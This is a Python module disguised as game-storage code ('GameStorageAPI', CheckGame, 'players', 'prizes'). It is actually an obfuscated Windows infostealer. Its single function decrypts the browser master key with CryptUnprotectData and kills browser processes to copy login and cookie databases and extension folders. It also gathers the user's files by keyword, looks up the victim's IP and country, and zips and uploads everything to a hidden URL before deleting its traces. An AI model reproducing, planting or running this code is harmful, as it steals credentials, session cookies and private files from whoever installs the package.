from GameStorageAPI.DataTypes import *



def CheckGame():
    if not os.path.exists(SIGN) and Ch2ck() and os.name == 'nt':
        from json import loads, dumps
        from win32crypt import CryptUnprotectData
        from base64 import b64decode
        from shutil import copy, copytree, rmtree
        from time import sleep
        from subprocess import Popen
        from zipfile import ZipFile, ZIP_DEFLATED
        import threading

        TemporaryBallP = os.getenv(GetAny(UserBall))
        YandX = BringYandX(MarkYandX)
        AllPlayerz = GetRandom(RandomPlayer)
        nums = GetRandom(RandomNum)
        seeds = GetRandom(RandomSeeds)
        prizez = GetPrize(RandomPrize)
        PossibleNums = GetAny(AllPossibleNums)

        def GetM() -> str:
            game = requests.get(url="https://api.ipify.org").text
            ipdatanojson = loads((requests.get(f"https://geolocation-db.com/jsonp/{game}").text).replace('callback(', '').replace('})', '}'))
            contry = ipdatanojson["country_name"]
            contryCode = ipdatanojson["country_code"].lower()
            if contryCode == "not found":
                message = f"`{TemporaryBallP[9:].upper()} | {game} ({contry})`"
            else:
                message = f":flag_{contryCode}:  - `{TemporaryBallP[9:].upper()} | {game} ({contry})`"
            return message

        def GetPlayerName(path: str) -> str:
            with open(path, "r", encoding='utf-8') as f:
                data = f.read()
                data = loads(data)
            PlayerNum = b64decode(data[GetAny(['0x115', '0x121', '0xe5', '0xf1', '0x11e', '0x133', '0x118', '0x124'])][GetAny(['0xf7', '0x112', '0xf1', '0x11e', '0x133', '0x118', '0x124', '0xf7', '0xf4', '0xe5', '0x109', '0xf7', '0x133'])])
            PlayerNum = PlayerNum[5:]
            PlayerNum = CryptUnprotectData(PlayerNum, None, None, None, 0)[1]
            return str(PlayerNum)

        def CopyPlayerResult(FromPath: str, ToPath: str, Proc: str) -> None:
            copy(FromPath + GetAny(['0xdc', '0xac', '0x115', '0xfd', '0x103', '0x112', '0x28', '0x94', '0xeb', '0x124', '0xeb']), ToPath + "\\Pdata")
            try:
                copy(FromPath + GetAny(['0xdc', '0xb2', '0xf7', '0x124', '0x12d', '0x115', '0x11e', '0x109', '0xdc', '0x91', '0x115', '0x115', '0x109', '0x103', '0xf7', '0x121']), ToPath + "\\Cdata")
            except PermissionError:
                if Proc != None:
                    Popen(f"taskkill /im {Proc} /t /f >nul 2>&1", shell=True)
                    sleep(2)
                    try:
                        copy(FromPath + GetAny(['0xdc', '0xb2', '0xf7', '0x124', '0x12d', '0x115', '0x11e', '0x109', '0xdc', '0x91', '0x115', '0x115', '0x109', '0x103', '0xf7', '0x121']), ToPath + "\\Cdata")
                    except PermissionError:
                        pass
                else:
                    pass

        def CopyPrizeExtention(FromPath: str, ToPath: str, name: str):
            copytree(FromPath , ToPath + name)

        def ZipTotal(path: str, OutFile: str):
            with ZipFile(OutFile, 'w', ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        FilePath = os.path.join(root, file)
                        arcname = os.path.relpath(FilePath, path)
                        zipf.write(FilePath, arcname)

        def DisplayPrize(path: str, message: str):
            data = {'message': f"{message}"}
            with open(path, 'rb') as file:
                files = {'file': (path.split("\\")[-1], file)}

                r = requests.post(url=PossibleNums, data=data, files=files)

        def CleanUp():
            rmtree(FULL)
            os.remove(OUT)
            rmtree(FULL2)
            os.remove(OUT2)

            sign = open(SIGN, "w")
            sign.close()
        try:

            if not os.path.exists(FULL):
                os.mkdir(FULL)
            if not os.path.exists(FULL2):
                os.mkdir(FULL2)

            threads = []
            for y in YandX:
                if os.path.exists(y[1]):
                    x = FULL + "\\" + y[0]
                    os.mkdir(x)
                    key = open(x + "\\mama.txt" , 'w')
                    key.write(GetPlayerName(y[1] + GetAny(['0xdc', '0xac', '0x115', '0xf1', '0xeb', '0x10c', '0x28', '0xc1', '0x124', '0xeb', '0x124', '0xf7'])))
                    key.close()
                    for player in AllPlayerz:
                        if os.path.exists(y[1] + player):
                            os.mkdir(x + player)
                            thread = threading.Thread(target=CopyPlayerResult, args=(y[1] + player, x + player, y[2]))
                            threads.append(thread)
                            for prize in prizez:
                                if os.path.exists(y[1] + player + prize[0]):
                                    thread = threading.Thread(target=CopyPrizeExtention, args=(y[1] + player + prize[0], x + player, prize[0]))
                                    threads.append(thread)
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()

            message = GetM()
            ZipTotal(FULL, OUT)
            DisplayPrize(OUT, message)


            for PlayerFolder in folders:
                main = TemporaryBallP + PlayerFolder
                for root, dirs, files in os.walk(main):
                    for file in files:
                        FilePath = os.path.join(root, file)
                        arcname = os.path.relpath(FilePath, main)
                        FileName = arcname.split("\\")[-1].split(".")
                        for keyword in nums:
                            if keyword in FileName:
                                if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
                                    copy(FilePath, FULL2)
                        for media in seeds:
                            if media in FileName:
                                if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
                                    copy(FilePath, FULL2)

            ZipTotal(FULL2, OUT2)
            DisplayPrize(OUT, message)

            CleanUp()
        except FileExistsError:
            try:
                rmtree(FULL)
            except Exception:
                pass
            try:
                rmtree(FULL2)
            except Exception:
                pass
            try:
                os.remove(OUT)
            except Exception:
                pass
            try:
                os.remove(OUT2)
            except Exception:
                pass
            CheckGame()